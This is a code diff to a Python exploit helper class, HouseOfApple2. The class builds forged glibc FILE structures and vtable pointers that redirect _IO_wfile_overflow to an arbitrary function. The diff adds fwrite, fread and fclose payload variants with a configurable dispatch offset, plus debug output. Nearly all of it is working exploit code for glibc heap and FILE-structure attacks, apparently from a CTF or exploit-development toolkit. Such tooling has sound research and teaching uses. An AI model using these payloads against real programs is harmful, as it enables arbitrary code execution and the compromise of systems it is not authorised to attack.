@@ -52,9 +52,18 @@ class HouseOfApple2:
         self._ptr_to_null = ptr_to_null
         self._libc_io_wfile_jumps = libc_io_wfile_jumps
 
-    def payload(self, base_ptr, arbitrary_func, arg=None):
+    def fwrite_payload(self, base_ptr, arbitrary_func, arg=None):
+        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x38, arg=arg)
+
+    def fread_payload(self, base_ptr, arbitrary_func, arg=None):
+        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x40, arg=arg)
+
+    def fclose_payload(self, base_ptr, arbitrary_func, arg=None):
+        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x38, arg=arg)
+
+    def payload(self, base_ptr, arbitrary_func, dispatch_offset=0x38, arg=None):
         io_wfile_overflow = self._libc_io_wfile_jumps + 0x8 * 3
-        file_vtable = io_wfile_overflow - 0x38
+        file_vtable = io_wfile_overflow - dispatch_offset
 
         file_struct = self._file_struct(file_vtable, base_ptr + 8)
         wide_data_vtable = base_ptr + len(file_struct) - 0x68
@@ -66,7 +75,9 @@ class HouseOfApple2:
         print(f"file_struct @ {base_ptr:#x}")
         print(f"io_wfile_overflow @ {io_wfile_overflow:#x}")
         print(f"file_vtable @ {file_vtable:#x}")
-        print(f"io_wfile_overflow @ [file_vtable+0x38] {file_vtable+0x38:#x}")
+        print(
+            f"io_wfile_overflow @ [file_vtable+dispatch_offset] {file_vtable+dispatch_offset:#x}"
+        )
         print(f"wide_data_vtable vtable @ {wide_data_vtable:#x}")
         print(f"arbitrary func @ [wide_data_vtable+0x68] {wide_data_vtable+0x68:#x}")
 
